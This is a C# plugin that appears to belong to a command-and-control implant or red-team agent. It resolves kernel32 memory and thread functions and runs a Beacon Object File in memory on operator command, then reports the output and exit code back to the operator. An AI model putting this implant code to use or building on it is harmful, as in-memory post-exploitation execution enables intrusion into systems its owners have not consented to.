using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using Invoker.Dynamic;
namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "coff";
        private IDataBroker messageManager { get; set; }
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                List<string> k32funcs = new List<string>()
                {
                    "va",
                    "vf",
                    "gph",
                    "ha",
                    "zm",
                    "hf",
                    "ll",
                    "gpa",
                    "ct",
                    "gect",
                    "wfso",
                    "vp",
                };

                if (!Resolver.TryResolveFuncs(k32funcs, "k32", out var err)){
                    messageManager.WriteLine(err, job.task.id, true, "error");
                }

                BofRunner br = new BofRunner(args);
                br.LoadBof();

                BofRunnerOutput bro = br.RunBof(60);
                messageManager.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", job.task.id, true);
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
